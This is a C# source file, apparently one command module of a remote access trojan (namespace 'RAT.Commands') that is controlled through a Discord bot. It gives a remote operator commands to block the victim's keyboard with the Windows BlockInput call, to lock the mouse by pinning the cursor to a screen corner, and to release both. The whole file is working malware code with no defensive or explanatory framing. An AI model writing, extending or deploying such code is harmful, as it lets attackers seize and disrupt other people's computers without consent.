using System;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows.Forms;
using Discord;
using Discord.Commands;
using Discord.WebSocket;

namespace RAT.Commands
{
    public class LockInput : ModuleBase<SocketCommandContext>
    {
        [DllImport("user32.dll", SetLastError = true)]
        public static extern bool BlockInput(bool fBlockIt);

        private static System.Drawing.Point originalMousePosition;
        private static bool isMouseLocked = false;

        [Command("lockkeyboard")]
        public async Task LockKeyboardInputCmd()
        {
            try
            {


                // Lock the keyboard
                BlockInput(true);




                await ReplyAsync("Keyboard Input has been locked.");
            }
            catch (Exception ex)
            {
                await ReplyAsync($"An error occurred while trying to lock keyboard input : {ex.Message}");
            }
        }

        [Command("lockmouse")]
        public async Task lockMouseCmd()
        {
            try
            {
                // Store the original mouse position
                originalMousePosition = Cursor.Position;
                isMouseLocked = true;
                Task.Run(() =>
                {
                    while (isMouseLocked)
                    {
                        Cursor.Position = new System.Drawing.Point(Screen.PrimaryScreen.Bounds.Width - 1, Screen.PrimaryScreen.Bounds.Height - 1);
                        Task.Delay(100).Wait(); // Sleep for 100 ms to save CPU usage
                    }
                });

                await ReplyAsync("The Mouse Input Locked");

            }
            catch (Exception ex)
            {
                await ReplyAsync($"Error Occured while locking mouse : {ex.Message}");
            }
        }
        [Command("unlockmouse")]
        public async Task UnlockMouseCmd()
        {
            try
            {
                isMouseLocked = false;
                Cursor.Position = originalMousePosition;
                await ReplyAsync("Mouse input Unlocked");
            }
            catch (Exception ex)
            {
                await ReplyAsync($"Error Occured while unlocking mouse input : {ex.Message}");

            }
        }


        [Command("unlockkeyboard")]
        public async Task UnlockkeyboardCmd()
        {
            try
            {
                // Unlock the keyboard
                BlockInput(false);




                await ReplyAsync("Keyboard Input has been unlocked.");
            }
            catch (Exception ex)
            {
                await ReplyAsync($"An error occurred while trying to unlock keyboad input: {ex.Message}");
            }
        }

    }
}
